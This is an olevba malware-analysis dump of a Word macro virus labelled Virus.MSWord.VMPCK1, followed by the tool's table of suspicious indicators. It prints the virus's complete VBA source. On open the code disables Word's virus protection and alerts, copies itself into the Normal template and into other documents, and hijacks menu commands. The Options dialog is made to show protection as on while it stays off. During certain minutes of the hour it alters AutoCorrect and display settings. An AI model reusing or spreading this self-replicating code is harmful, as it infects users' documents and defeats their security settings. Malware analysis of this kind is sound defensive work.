olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPCK1.cd
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPCK1.cd - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO colorinm.bas 
in file: Virus.MSWord.VMPCK1.cd - OLE stream: 'Macros/VBA/colorinm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
Options.VirusProtection = False
End Sub
Sub AutoOpen()
Dim c As Byte
On Error Resume Next
Application.VBE.Mainwindow.Close
Options.VirusProtection = 0
Application.EnableCancelKey = 0
Application.ScreenUpdating = 0
Application.DisplayAlerts = 0
inf
CommandBars("Control Toolbox").Enabled = 0
CommandBars("Tools").Controls(14).Enabled = 0
CommandBars("Tools").Controls(15).Enabled = 0
CommandBars("View").Controls(6).Enabled = 0
CommandBars("Edit").Controls(9).Enabled = 0
CommandBars("Tools").Controls(5).OnAction = "oculta1"
CommandBars("Tools").Controls(16).OnAction = "oculta2"
ActiveDocument.Variables.Add Name:="activo"
If Minute((Now)) >= 56 Or Minute((Now)) <= 3 Then
                                ActiveDocument.Variables("activo") = "si"
                                Options.BlueScreen = True
                                agrega
Else: ActiveDocument.Variables("activo") = "no"
End If
End Sub
Sub inf()
Application.EnableCancelKey = 0
On Error Resume Next
    If Nch = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="colorinm", Object:=wdOrganizerObjectProjectItems
        ActiveDocument.BuiltInDocumentProperties(wdPropertyComments) = "Comentarios, sugerencias, insultos?:" + vbCr + "a a b b c d e @ y a h o o . c o m"
    End If
    If Dch = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="colorinm", Object:=wdOrganizerObjectProjectItems
    End If
End Sub
Function Nch()
Dim i As Byte
    For i = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(i).Name = "colorinm" Then Nch = True
    Next
End Function
Function Dch()
Dim j As Byte
    For j = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(j).Name = "colorinm" Then Dch = True
    Next
End Function
Sub oculta1()
If ActiveDocument.Variables("activo").Value = "si" Then
            borrador
            Word.Dialogs.Item(wdDialogToolsAutoManager).Show
            agrega
    Else: Word.Dialogs.Item(wdDialogToolsAutoManager).Show
End If
End Sub
Sub oculta2()
aparentes
Word.Dialogs.Item(wdDialogToolsOptions).Show
reales
End Sub
Sub agrega()
Attribute agrega.VB_Description = "Macro grabada el 24/08/98 por MINIPHONE"
Attribute agrega.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.final"
Dim letra, color
    Selection.ParagraphFormat.Alignment = wdAlignParagraphLeft
    For vez = 1 To 18
    Select Case vez
            Case 1
                letra = "a"
                color = 7
            Case 2
                letra = "o"
                color = 3
            Case 3
                letra = "y"
                color = 6
            Case 4
                letra = "de"
                color = 7
            Case 5
                letra = "en"
                color = 4
            Case 6
                letra = "que"
                color = 3
            Case 7
                letra = "la"
                color = 6
            Case 8
                letra = "los"
                color = 5
            Case 9
                letra = "las"
                color = 4
            Case 10
                letra = "le"
                color = 5
            Case 11
                letra = "se"
                color = 7
            Case 12
                letra = "ya"
                color = 5
            Case 13
                letra = "no"
                color = 7
            Case 14
                letra = "lo"
                color = 4
            Case 15
                letra = "un"
                color = 3
            Case 16
                letra = "con"
                color = 6
            Case 17
                letra = "si"
                color = 3
            Case 18
                letra = "es"
                color = 3
          End Select
    With Selection
            .Font.ColorIndex = color
            .TypeText Text:=letra
            .MoveLeft Unit:=wdWord, Count:=1, Extend:=wdExtend
    End With
    autocorrect.Entries.AddRichText Name:=letra, Range:=Selection.Range
 Next vez
 autocorrect.ReplaceText = True
 With Selection
    .Delete
    .Font.ColorIndex = wdAuto
    .Font.Name = "Times New Roman"
    .Font.Size = 112
 End With
End Sub
Sub borrador()
Attribute borrador.VB_Description = "Macro grabada el 24/08/98 por MINIPHONE"
Attribute borrador.VB_ProcData.VB_Invoke_Func = "Project.NewMacros.Macro1asasa"
On Error Resume Next
autocorrect.ReplaceText = 0
With autocorrect.Entries
.Item("a").Delete
.Item("o").Delete
.Item("y").Delete
.Item("de").Delete
.Item("en").Delete
.Item("que").Delete
.Item("la").Delete
.Item("los").Delete
.Item("las").Delete
.Item("le").Delete
.Item("se").Delete
.Item("ya").Delete
.Item("no").Delete
.Item("lo").Delete
.Item("un").Delete
.Item("con").Delete
.Item("si").Delete
.Item("es").Delete
End With
End Sub
Sub aparentes()
    With Options
        .VirusProtection = 1
        .SaveNormalPrompt = 1
    End With
End Sub
Sub reales()
On Error Resume Next
    If ActiveDocument.Variables("activo").Value = "si" Then Options.BlueScreen = True
    With Options
        .AllowFastSave = 1
        .VirusProtection = 0
        .SavePropertiesPrompt = 0
        .SaveNormalPrompt = 0
    End With
End Sub
Sub chau()
If ActiveDocument.Variables("activo").Value = "si" Then
        borrador
        Options.BlueScreen = 0
    End If
        ActiveDocument.Variables("activo").Delete
        Options.VirusProtection = 0
End Sub
Sub Toolsmacro()
End Sub
Sub ViewVBCode()
End Sub
Sub AutoClose()
inf
chau
End Sub
Sub FileSave()
inf
ActiveDocument.Save
End Sub
Sub AutoExit()
inf
chau
End Sub
Sub FileSaveas()
inf
Dialogs(wdDialogFileSaveAs).Show
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

